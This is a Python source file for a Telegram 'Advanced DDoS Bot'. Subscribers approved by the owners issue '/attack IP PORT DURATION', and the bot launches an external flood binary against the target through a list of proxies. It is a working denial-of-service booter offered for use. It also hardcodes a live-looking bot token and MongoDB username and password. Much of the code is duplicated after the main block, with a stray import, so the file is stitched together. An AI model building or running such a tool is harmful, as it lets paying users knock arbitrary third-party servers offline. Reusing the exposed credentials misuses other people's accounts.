import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread, Lock
import asyncio
import aiohttp
from telebot import types

# ---------------------- Configuration & Initialization ---------------------- #

# Bot settings
TOKEN = '6956168627:AAGHJockG55ud8JpOvtk-i8VoNhnEMi1Uv8'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002183651722
CHANNEL_ID = -1002183651722
ERROR_CHANNEL_ID = -1002183651722

# Owners, blocked ports, and other global settings
OWNERS = {6552242136, 1695959688}
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
REQUEST_INTERVAL = 1

# Maintain independent attack status for each chat
ongoing_attacks = {}  # { chat_id: True } indicates an attack is in progress in that chat
attack_lock = Lock()

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# MongoDB Client initialization with certificate authority file for TLS
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

# Initialize telebot
bot = telebot.TeleBot(TOKEN, parse_mode="html")

# List of proxies for attack connections
proxy_list = [
    "http://43.134.234.74:443",
    "http://175.101.18.21:5678",
    "http://179.189.196.52:5678"
]

# Create a separate asyncio event loop running in the background
loop = asyncio.new_event_loop()
def start_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()
asyncio_thread = Thread(target=start_loop, args=(loop,), daemon=True)
asyncio_thread.start()

# ---------------------- Helper Functions ---------------------- #

def is_owner(user_id):
    return user_id in OWNERS

def get_proxy():
    """Return a random proxy for attack-related connections."""
    chosen = random.choice(proxy_list)
    return {'http': chosen, 'https': chosen}

# ---------------------- Bot Command Handlers ---------------------- #

@bot.message_handler(commands=['approve', 'disapprove'])
def handle_approval(message):
    try:
        if not is_owner(message.from_user.id):
            bot.reply_to(message, "<b>🚫</b> Owner access required!")
            return

        cmd_words = message.text.split()
        command = cmd_words[0].lower()

        if command == '/approve':
            if len(cmd_words) < 3:
                bot.reply_to(message, "<b>⚠️</b> Use: <i>/approve &lt;user_id&gt; &lt;days&gt;</i>")
                return
            try:
                target_id = int(cmd_words[1])
                days = int(cmd_words[2])
            except ValueError:
                bot.reply_to(message, "<b>⚠️</b> Please provide valid numerical values for user_id and days.")
                return

            valid_until = datetime.now() + timedelta(days=days)
            users_collection.update_one(
                {"user_id": target_id},
                {"$set": {
                    "valid_until": valid_until,
                    "approved": True
                }},
                upsert=True
            )
            bot.reply_to(message, f"<b>✅</b> Approved user <code>{target_id}</code> for <b>{days}</b> days")
            
        elif command == '/disapprove':
            if len(cmd_words) < 2:
                bot.reply_to(message, "<b>⚠️</b> Use: <i>/disapprove &lt;user_id&gt;</i>")
                return
            try:
                target_id = int(cmd_words[1])
            except ValueError:
                bot.reply_to(message, "<b>⚠️</b> Please provide a valid numerical user_id.")
                return

            users_collection.update_one(
                {"user_id": target_id},
                {"$set": {
                    "approved": False
                }},
                upsert=True
            )
            bot.reply_to(message, f"<b>✅</b> Disapproved user <code>{target_id}</code>")
    except Exception as e:
        logging.error(f"Approval command error: {e}")
        bot.reply_to(message, "<b>❌</b> Error processing command")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    chat_id = message.chat.id
    with attack_lock:
        if ongoing_attacks.get(chat_id, False):
            bot.reply_to(message, "<b>⚠️</b> An attack is already ongoing in this chat. Please wait and try again later.")
            return
        # Set the attack status for the chat as active.
        ongoing_attacks[chat_id] = True

    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        
        if not user_data or not user_data.get('approved'):
            bot.reply_to(message, "<b>🚫</b> Contact <a href='tg://user?id=6552242136'>Owner</a> for access.")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "<b>⚠️</b> Use: <i>/attack IP PORT DURATION</i>")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        ip = parts[1]
        try:
            port = int(parts[2])
            duration = int(parts[3])
        except ValueError:
            bot.reply_to(message, "<b>⚠️</b> Please provide valid numerical values for PORT and DURATION.")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        if port in blocked_ports:
            bot.reply_to(message, f"<b>🚫</b> Port <code>{port}</code> is blocked.")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        if duration > 599:
            bot.reply_to(message, "<b>⏳</b> Max duration is <code>599</code> seconds.")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        # Send initial attack output message
        output_msg = bot.send_message(chat_id, f"<b>🚀 Attack started!</b>\nTarget: <code>{ip}</code>\nPort: <code>{port}</code>\nDuration: <code>{duration}</code>s\n\n<b>Output:</b>\n")
        
        # Use a proxy for the attack and schedule the async run_attack
        proxy = get_proxy()
        asyncio.run_coroutine_threadsafe(
            run_attack(ip, port, duration, proxy, chat_id, output_msg.message_id),
            loop
        )
    except Exception as e:
        with attack_lock:
            ongoing_attacks[chat_id] = False
        logging.error(f"Attack error: {e}")
        bot.reply_to(message, "<b>❌</b> Attack failed")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    # When the inline button is pressed, provide additional info if needed.
    if call.data == "attack_info":
        bot.answer_callback_query(call.id, "Attack is in progress. Check output for details.")

@bot.message_handler(commands=['myinfo'])
def myinfo(message):
    try:
        user_data = users_collection.find_one({"user_id": message.from_user.id})
        if not user_data or not user_data.get('approved'):
            bot.reply_to(message, "<b>🔒</b> Not approved")
            return

        # Calculate remaining days of approval
        remaining_days = (user_data['valid_until'] - datetime.now()).days
        bot.reply_to(message, f"<b>📅</b> Your access is valid for <code>{remaining_days}</code> days left.")
    except Exception as e:
        logging.error(f"Myinfo error: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    start_text = (
        "<b>Welcome to the Advanced DDoS Bot</b>\n\n"
        "Use <i>/attack IP PORT DURATION</i>\n"
        "Example: <code>/attack 1.1.1.1 80 60</code>\n\n"
        "For info and support, press the button below."
    )
    markup = types.InlineKeyboardMarkup()
    btn_help = types.InlineKeyboardButton("Help", url="https://t.me/AGEON_OWNER")
    markup.add(btn_help)
    bot.send_message(message.chat.id, start_text, reply_markup=markup)

# ---------------------- Asynchronous Attack Logic ---------------------- #

async def run_attack(ip, port, duration, proxy, chat_id, message_id):
    try:
        # Start the external attack command with the given proxy settings
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 90",
            env={**os.environ, "HTTP_PROXY": proxy['http'], "HTTPS_PROXY": proxy['https']},
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        output_text = ""
        # Read output line by line and update the Telegram message concurrently
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            decoded_line = line.decode('utf-8').strip()
            output_text += decoded_line + "\n"
            try:
                bot.edit_message_text(f"<b>🚀 Attack started!</b>\nTarget: <code>{ip}</code>\nPort: <code>{port}</code>\nDuration: <code>{duration}</code>s\n\n<b>Output:</b>\n{output_text}", chat_id, message_id)
            except Exception as ex:
                logging.error(f"Error updating attack output: {ex}")
        # Optionally capture stderr if needed
        err = await process.stderr.read()
        if err:
            err_text = err.decode('utf-8').strip()
            output_text += "\n<b>Errors:</b>\n" + err_text
            try:
                bot.edit_message_text(f"<b>🚀 Attack started!</b>\nTarget: <code>{ip}</code>\nPort: <code>{port}</code>\nDuration: <code>{duration}</code>s\n\n<b>Output:</b>\n{output_text}", chat_id, message_id)
            except Exception as ex:
                logging.error(f"Error updating error output: {ex}")
        await process.wait()
    except Exception as e:
        logging.error(f"run_attack exception: {e}")
        try:
            bot.edit_message_text("<b>❌ Attack process encountered an error.</b>", chat_id, message_id)
        except Exception as ex:
            logging.error(f"Error updating message after exception: {ex}")
    finally:
        with attack_lock:
            ongoing_attacks[chat_id] = False

# ---------------------- Main Execution ---------------------- #

if __name__ == "__main__":
    logging.info("Starting bot on multi-VPS deployment with concurrent attack outputs...")
    try:
        bot.infinity_polling()
    except Exception as e:
        logging.error(f"Bot polling error: {e}")import os

            if len(cmd_words) < 3:
                bot.reply_to(message, "<b>⚠️</b> Use: <i>/approve &lt;user_id&gt; &lt;days&gt;</i>")
                return
            try:
                target_id = int(cmd_words[1])
                days = int(cmd_words[2])
            except ValueError:
                bot.reply_to(message, "<b>⚠️</b> Please provide valid numerical values for user_id and days.")
                return

            valid_until = datetime.now() + timedelta(days=days)
            users_collection.update_one(
                {"user_id": target_id},
                {"$set": {
                    "valid_until": valid_until,
                    "approved": True
                }},
                upsert=True
            )
            bot.reply_to(message, f"<b>✅</b> Approved user <code>{target_id}</code> for <b>{days}</b> days")
            
        elif command == '/disapprove':
            if len(cmd_words) < 2:
                bot.reply_to(message, "<b>⚠️</b> Use: <i>/disapprove &lt;user_id&gt;</i>")
                return
            try:
                target_id = int(cmd_words[1])
            except ValueError:
                bot.reply_to(message, "<b>⚠️</b> Please provide a valid numerical user_id.")
                return

            users_collection.update_one(
                {"user_id": target_id},
                {"$set": {
                    "approved": False
                }},
                upsert=True
            )
            bot.reply_to(message, f"<b>✅</b> Disapproved user <code>{target_id}</code>")
    except Exception as e:
        logging.error(f"Approval command error: {e}")
        bot.reply_to(message, "<b>❌</b> Error processing command")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    chat_id = message.chat.id
    with attack_lock:
        if ongoing_attacks.get(chat_id, False):
            bot.reply_to(message, "<b>⚠️</b> An attack is already ongoing in this chat. Please wait and try again later.")
            return
        # Set the attack status for the chat as active.
        ongoing_attacks[chat_id] = True

    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        
        if not user_data or not user_data.get('approved'):
            bot.reply_to(message, "<b>🚫</b> Contact <a href='tg://user?id=6552242136'>Owner</a> for access.")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "<b>⚠️</b> Use: <i>/attack IP PORT DURATION</i>")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        ip = parts[1]
        try:
            port = int(parts[2])
            duration = int(parts[3])
        except ValueError:
            bot.reply_to(message, "<b>⚠️</b> Please provide valid numerical values for PORT and DURATION.")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        if port in blocked_ports:
            bot.reply_to(message, f"<b>🚫</b> Port <code>{port}</code> is blocked.")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        if duration > 599:
            bot.reply_to(message, "<b>⏳</b> Max duration is <code>599</code> seconds.")
            with attack_lock:
                ongoing_attacks[chat_id] = False
            return

        # Send initial attack output message
        output_msg = bot.send_message(chat_id, f"<b>🚀 Attack started!</b>\nTarget: <code>{ip}</code>\nPort: <code>{port}</code>\nDuration: <code>{duration}</code>s\n\n<b>Output:</b>\n")
        
        # Use a proxy for the attack and schedule the async run_attack
        proxy = get_proxy()
        asyncio.run_coroutine_threadsafe(
            run_attack(ip, port, duration, proxy, chat_id, output_msg.message_id),
            loop
        )
    except Exception as e:
        with attack_lock:
            ongoing_attacks[chat_id] = False
        logging.error(f"Attack error: {e}")
        bot.reply_to(message, "<b>❌</b> Attack failed")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    # When the inline button is pressed, provide additional info if needed.
    if call.data == "attack_info":
        bot.answer_callback_query(call.id, "Attack is in progress. Check output for details.")

@bot.message_handler(commands=['myinfo'])
def myinfo(message):
    try:
        user_data = users_collection.find_one({"user_id": message.from_user.id})
        if not user_data or not user_data.get('approved'):
            bot.reply_to(message, "<b>🔒</b> Not approved")
            return

        # Calculate remaining days of approval
        remaining_days = (user_data['valid_until'] - datetime.now()).days
        bot.reply_to(message, f"<b>📅</b> Your access is valid for <code>{remaining_days}</code> days left.")
    except Exception as e:
        logging.error(f"Myinfo error: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    start_text = (
        "<b>Welcome to the Advanced DDoS Bot</b>\n\n"
        "Use <i>/attack IP PORT DURATION</i>\n"
        "Example: <code>/attack 1.1.1.1 80 60</code>\n\n"
        "For info and support, press the button below."
    )
    markup = types.InlineKeyboardMarkup()
    btn_help = types.InlineKeyboardButton("Help", url="https://t.me/AGEON_OWNER")
    markup.add(btn_help)
    bot.send_message(message.chat.id, start_text, reply_markup=markup)

# ---------------------- Asynchronous Attack Logic ---------------------- #

async def run_attack(ip, port, duration, proxy, chat_id, message_id):
    try:
        # Start the external attack command with the given proxy settings
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 90",
            env={**os.environ, "HTTP_PROXY": proxy['http'], "HTTPS_PROXY": proxy['https']},
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        output_text = ""
        # Read output line by line and update the Telegram message concurrently
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            decoded_line = line.decode('utf-8').strip()
            output_text += decoded_line + "\n"
            try:
                bot.edit_message_text(f"<b>🚀 Attack started!</b>\nTarget: <code>{ip}</code>\nPort: <code>{port}</code>\nDuration: <code>{duration}</code>s\n\n<b>Output:</b>\n{output_text}", chat_id, message_id)
            except Exception as ex:
                logging.error(f"Error updating attack output: {ex}")
        # Optionally capture stderr if needed
        err = await process.stderr.read()
        if err:
            err_text = err.decode('utf-8').strip()
            output_text += "\n<b>Errors:</b>\n" + err_text
            try:
                bot.edit_message_text(f"<b>🚀 Attack started!</b>\nTarget: <code>{ip}</code>\nPort: <code>{port}</code>\nDuration: <code>{duration}</code>s\n\n<b>Output:</b>\n{output_text}", chat_id, message_id)
            except Exception as ex:
                logging.error(f"Error updating error output: {ex}")
        await process.wait()
    except Exception as e:
        logging.error(f"run_attack exception: {e}")
        try:
            bot.edit_message_text("<b>❌ Attack process encountered an error.</b>", chat_id, message_id)
        except Exception as ex:
            logging.error(f"Error updating message after exception: {ex}")
    finally:
        with attack_lock:
            ongoing_attacks[chat_id] = False

# ---------------------- Main Execution ---------------------- #

if __name__ == "__main__":
    logging.info("Starting bot on multi-VPS deployment with concurrent attack outputs...")
    try:
        bot.infinity_polling()
    except Exception as e:
        logging.error(f"Bot polling error: {e}")
